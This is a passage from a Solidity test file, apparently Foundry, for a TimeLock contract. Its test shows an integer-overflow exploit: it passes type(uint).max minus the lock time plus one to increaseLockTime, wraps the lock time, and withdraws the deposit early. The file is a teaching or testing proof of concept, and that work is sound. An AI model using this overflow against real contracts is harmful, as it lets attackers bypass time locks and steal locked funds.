                transferValue = balances[msg.sender];
                _step = 3;
            } else if (_step == 3) {
                balances[msg.sender] = 0;
                _step = 4;
            } else if (_step == 4) {
                (bool sent, ) = payable(msg.sender).call{value: transferValue}("");
                require(sent, "Failed to send Ether");
                _step = 5;
            } else if (_step == 5) {
                break;
            }
        }
    }
}

contract TimeLockExploitTest is Test {
    TimeLock timelock;

    function setUp() public {
        timelock = new TimeLock();
        vm.deal(address(this), 1 ether);
        timelock.deposit{value: 1 ether}();
    }

    function test_exploit_arithmetic() public {
        uint originalLockTime = timelock.lockTime(address(this));
        assertGt(originalLockTime, block.timestamp);

        uint maxUint = type(uint).max;
        uint overflowAmount = maxUint - originalLockTime + 1;

        timelock.increaseLockTime(overflowAmount);

        uint newLockTime = timelock.lockTime(address(this));

        assertTrue(newLockTime < block.timestamp);

        timelock.withdraw();

        uint balanceAfterWithdraw = timelock.balances(address(this));
        assertEq(balanceAfterWithdraw, 0);
    }
}

